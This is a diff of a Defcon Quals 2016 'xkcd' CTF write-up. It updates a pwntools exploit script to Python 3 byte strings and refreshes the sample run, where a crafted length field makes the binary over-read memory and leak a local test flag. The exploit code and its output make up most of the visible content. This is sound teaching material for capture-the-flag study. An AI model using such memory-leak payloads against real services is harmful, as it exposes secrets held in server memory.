@@ -1,5 +1,7 @@
 # Defcon Quals 2016 xkcd
 
+This was done on `Ubuntu 20.04.4 LTS`.
+
 Let's take a look at the challenge:
 
 ```
@@ -146,23 +148,24 @@ Now the offset between the start of our input and the flag is `0x6b7540 - 0x6b73
 
 Putting it all together here is a script that will leak it locally, when the flag is `flag{g0ttem_b0yz}`:
 ```
+$   cat exploit.py 
 from pwn import *
 
 target = process('./xkcd')
 #gdb.attach(target, gdbscript = 'b *0x401034\nb *0x401077\nb* 0x4010ba\nb *0x4010f4\nb *0x40110e')
 gdb.attach(target, gdbscript='b *main+0x1f1')
 
-payload = ""
-payload += "SERVER, ARE YOU STILL THERE"
-payload += "?"
-payload += " IF SO, REPLY "
-payload += '\"'
-payload += "0"*0x200
-payload += "\""
-payload += "111"
-payload += "("
-payload += "530"
-payload += ")"
+payload = b""
+payload += b"SERVER, ARE YOU STILL THERE"
+payload += b"?"
+payload += b" IF SO, REPLY "
+payload += b'\"'
+payload += b"0"*0x200
+payload += b"\""
+payload += b"111"
+payload += b"("
+payload += b"530"
+payload += b")"
 
 target.sendline(payload)
 
@@ -172,11 +175,12 @@ target.interactive()
 When we run it:
 
 ```
-$    python exploit.py
-[+] Starting local process './xkcd': pid 14087
-[*] running in new terminal: /usr/bin/gdb -q  "./xkcd" 14087 -x "/tmp/pwnkc4E6c.gdb"
+$   python3 exploit.py 
+[+] Starting local process './xkcd': pid 61153
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './xkcd', '61153', '-x', '/tmp/pwnu0i86bgy.gdb']
 [+] Waiting for debugger: Done
 [*] Switching to interactive mode
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000flag{g0ttem_b0yz}
 
+$  
 ```
